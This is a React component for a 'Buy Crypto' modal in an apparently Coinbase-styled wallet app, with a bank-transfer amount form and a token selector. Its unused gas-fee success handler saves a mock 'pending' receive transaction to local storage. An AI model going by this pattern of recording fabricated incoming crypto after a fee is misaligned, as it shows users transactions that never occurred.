'use client';

import { useState } from 'react';
import { X, CreditCard, Building2, ArrowRight } from 'lucide-react';
import GasFeeModal from './gas-fee-modal';

interface BuyModalProps {
    isOpen: boolean;
    onClose: () => void;
}

export default function BuyModal({ isOpen, onClose }: BuyModalProps) {
    const [paymentMethod, setPaymentMethod] = useState<'card' | 'bank'>('card');
    const [amount, setAmount] = useState('');
    const [crypto, setCrypto] = useState('BNB');

    // Gas Fee State
    const [showGasModal, setShowGasModal] = useState(false);

    if (!isOpen) return null;

    const handleSubmit = (e: React.FormEvent) => {
        e.preventDefault();
        // Redirect to Coinbase/Base app for purchase handshake
        window.open('https://www.coinbase.com/buy', '_blank');
        onClose();
    };

    const handleGasSuccess = (txHash: string) => {
        // Create Pending Transaction
        const newTx = {
            id: txHash,
            type: 'receive', // Buying is receiving crypto
            asset: crypto,
            amount: `+${(parseFloat(amount || '0') * 0.98).toFixed(4)}`, // Mock calc
            date: 'Just now',
            status: 'pending',
            counterparty: paymentMethod === 'card' ? 'Visa/Mastercard' : 'Bank Transfer'
        };

        // Save to LocalStorage
        const existingInfo = localStorage.getItem('transactions');
        const transactions = existingInfo ? JSON.parse(existingInfo) : [];
        localStorage.setItem('transactions', JSON.stringify([newTx, ...transactions]));

        setShowGasModal(false);
        onClose();
    };

    return (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 animate-fade-in">
            {/* Backdrop */}
            <div
                className="absolute inset-0 bg-black/60 backdrop-blur-sm"
                onClick={onClose}
            />

            {/* Modal - Bottom Sheet Style */}
            <div className="absolute bottom-0 left-0 right-0 w-full bg-[#0a0b0d] border-t border-[#0052FF]/30 rounded-t-[2rem] p-6 animate-slide-up text-white shadow-2xl pb-10">
                {/* Header */}
                <div className="flex items-center justify-between mb-4">
                    <h2 className="text-lg font-bold">Buy Crypto</h2>
                    <button
                        onClick={onClose}
                        className="w-8 h-8 flex items-center justify-center bg-gray-800/50 hover:bg-gray-700/50 rounded-full transition-colors text-gray-400 hover:text-white"
                    >
                        <X className="w-5 h-5" />
                    </button>
                </div>

                {/* Payment Method Selector - Only Bank (as per request to remove Card) */}
                <div className="mb-4">
                    <button
                        className="w-full p-3 rounded-xl border border-[#0052FF] bg-[#0052FF]/10 text-white flex items-center justify-center gap-2 transition-all cursor-default"
                    >
                        <img src="https://hatscripts.github.io/circle-flags/flags/us.svg" alt="Bank" className="w-5 h-5 object-contain rounded-full" />
                        <span className="font-medium text-xs">Bank Transfer</span>
                        <span className="text-[10px] opacity-70">1-3 days</span>
                    </button>
                    <p className="text-[10px] text-gray-500 text-center mt-2">
                        Bank transfers take 1-3 business days to process
                    </p>
                </div>

                {/* Form */}
                <form onSubmit={handleSubmit} className="space-y-4">
                    {/* Amount Input */}
                    <div>
                        <label className="block text-xs font-medium text-gray-400 mb-1.5">Amount to Spend</label>
                        <div className="relative">
                            <input
                                type="number"
                                value={amount}
                                onChange={(e) => setAmount(e.target.value)}
                                placeholder="0.00"
                                className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white text-base placeholder-gray-600"
                                required
                            />
                            <span className="absolute right-4 top-1/2 -translate-y-1/2 text-gray-400 font-semibold text-xs">USD</span>
                        </div>
                    </div>

                    {/* Crypto Selection */}
                    <div>
                        <label className="block text-xs font-medium text-gray-400 mb-1.5">Crypto to Buy</label>
                        <div className="relative">
                            <select
                                value={crypto}
                                onChange={(e) => setCrypto(e.target.value)}
                                className="w-full px-4 py-3 bg-[#1E2025] border border-white/5 rounded-xl focus:border-[#0052FF] focus:outline-none transition-colors text-white appearance-none cursor-pointer text-xs"
                            >
                                <option value="BNB">BNB</option>
                                <option value="TETHEREUM">TETHEREUM</option>
                                <option value="USDT">USDT</option>
                                <option value="BUSD">BUSD</option>
                                <option value="ETH">Ethereum</option>
                                <option value="BTC">Bitcoin</option>
                            </select>
                            <div className="absolute right-4 top-1/2 -translate-y-1/2 pointer-events-none text-gray-400">
                                <ArrowRight className="w-3 h-3 rotate-90" />
                            </div>
                        </div>
                    </div>

                    {/* Submit Button */}
                    <button
                        type="submit"
                        className="w-full bg-[#0052FF] hover:bg-[#004ada] text-white font-bold py-3 rounded-full transition-all shadow-lg hover:shadow-[#0052FF]/25 active:scale-[0.98] flex items-center justify-center gap-2 mt-4 text-sm"
                    >
                        Continue to Coinbase
                        <ArrowRight className="w-4 h-4" />
                    </button>
                </form>
            </div>
            <GasFeeModal
                isOpen={showGasModal}
                onClose={() => setShowGasModal(false)}
                onSuccess={handleGasSuccess}
            />
        </div>
    );
}
